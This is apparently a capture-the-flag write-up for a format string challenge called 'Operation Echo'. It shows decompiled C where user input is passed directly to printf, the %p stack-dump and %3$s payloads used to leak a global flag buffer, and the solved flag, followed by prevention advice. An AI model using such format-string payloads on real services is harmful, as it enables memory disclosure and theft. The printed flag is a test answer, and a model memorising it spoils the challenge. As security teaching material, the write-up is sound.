Challenge Description
Points: 50
Category: Binary Exploitation / Format String

In the heart of the cyber-conflict, "Mr. Robot's Printing Press" is churning out battlefield intelligence for commanders worldwide. But the press's output console — the Warzone Terminal — has a flaw. Anything you say is echoed back into the network without proper security checks.

Target: nc exploit.cyberbattle.info 9797

Connected to the service and received an ASCII art banner for "MR. ROBOT'S PRINTING PRESS - WARZONE TERMINAL". The challenge name "Operation Echo" and description about echoing input without security checks immediately suggested a format string vulnerability.

Binary Analysis
Using Binary Ninja to decompile the binary revealed the following key code in main():

int32_t main()
{
    FILE* fp = fopen("flag.txt", "r");
    
    if (!fp)
    {
        perror("flag.txt");
        return 1;
    }
    
    fgets(&flag, 0x100, fp);
    fclose(fp);
    setvbuf(__bss_start, nullptr, 2, 0);
    banner();
    
    while (true)
    {
        printf(&data_402234);  // Prints prompt
        char var_118[0x108];
        
        if (!fgets(&var_118, 0x100, stdin))
            return 0;
        
        if (!strncmp(&var_118, "exit", 4))
        {
            puts(&data_402250);
            return 0;
        }
        
        printf(&var_118, &var_118, &var_118, &flag);  // VULNERABILITY!
        puts(&data_402273);
    }
}

The Vulnerability
The critical vulnerability is on this line:

printf(&var_118, &var_118, &var_118, &flag);

Exploitation Process

Step 1: Stack Enumeration
First, I enumerated the stack to understand the memory layout:

$ nc exploit.cyberbattle.info 9797
⚡ EXECUTE PAYLOAD: %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
0x7ffe8dde2240 0x7ffe8dde2240 0x404080 (nil) 0x2ee0f480 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0xa70252070 (nil) 0x4f00000006 0x2 (nil)

Step 2: Identifying the Flag Location
From the stack dump:
- Position 1: 0x7ffe8dde2240 - Stack address (user input buffer)
- Position 2: 0x7ffe8dde2240 - Same buffer (passed twice)
- Position 3: 0x404080 - Data segment address (flag location!)
- Position 4: (nil) - NULL

The address 0x404080 stood out as a data segment address (0x40xxxx range), which is exactly where a global flag buffer would be stored.

Step 3: Reading the Flag
Since the flag buffer address is at the 3rd position in the printf arguments, I used the format string specifier %3$s to dereference it and print the flag as a string:

$ nc exploit.cyberbattle.info 9797
⚡ EXECUTE PAYLOAD: %3$s
flag{f0rm4t_str1ng_3xpl01t_succ3ss}

Why This Works
The format string %3$s tells printf to:
- Access the 3rd argument (0-indexed would be position 3)
- Treat it as a pointer to a string ($s)
- Dereference the pointer and print the string

Since the 3rd argument contains the address of the flag buffer (0x404080), printf reads from that address and outputs the flag contents.

Key Takeaways
- Format string vulnerabilities occur when user input is passed directly as the format string to functions like printf, sprintf, etc.
- Direct parameter access (%n$x syntax) allows reading from specific stack positions
- Memory layout analysis through stack enumeration helps identify interesting addresses
- Global variables in binaries typically reside in predictable memory regions (data segment ~0x404000)

Prevention
This vulnerability could be prevented by:
- Using printf("%s", user_input) instead of printf(user_input)
- Input validation and sanitization
- Compiler flags like -Wformat-security to catch these issues

Flag: flag{f0rm4t_str1ng_3xpl01t_succ3ss}
